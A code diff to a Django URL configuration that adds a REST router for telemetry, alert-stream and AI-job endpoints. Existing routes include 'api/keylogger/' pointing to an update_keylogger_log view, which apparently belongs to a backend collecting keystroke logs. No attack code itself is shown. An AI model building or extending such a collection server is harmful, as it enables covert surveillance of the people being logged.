@@ -1,5 +1,12 @@
-from django.urls import path
+from django.urls import path, include
+from rest_framework.routers import DefaultRouter
 from . import views
+from .viewsets import TelemetryViewSet, AlertStreamViewSet, AIJobViewSet
+
+router = DefaultRouter()
+router.register(r'telemetry', TelemetryViewSet, basename='telemetry')
+router.register(r'alerts', AlertStreamViewSet, basename='alerts')
+router.register(r'aijobs', AIJobViewSet, basename='aijob')
 
 urlpatterns = [
     path('placeholder/', views.landing, name='landing'),
@@ -16,4 +23,5 @@ urlpatterns = [
     path('api/keylogger/', views.update_keylogger_log, name='update_keylogger_log'),
     path('api/js_version/', views.js_version, name='js_version'),
     path('api/get_update_interval/', views.get_update_interval, name='get_update_interval'),
+    path('api/', include(router.urls)),
 ]
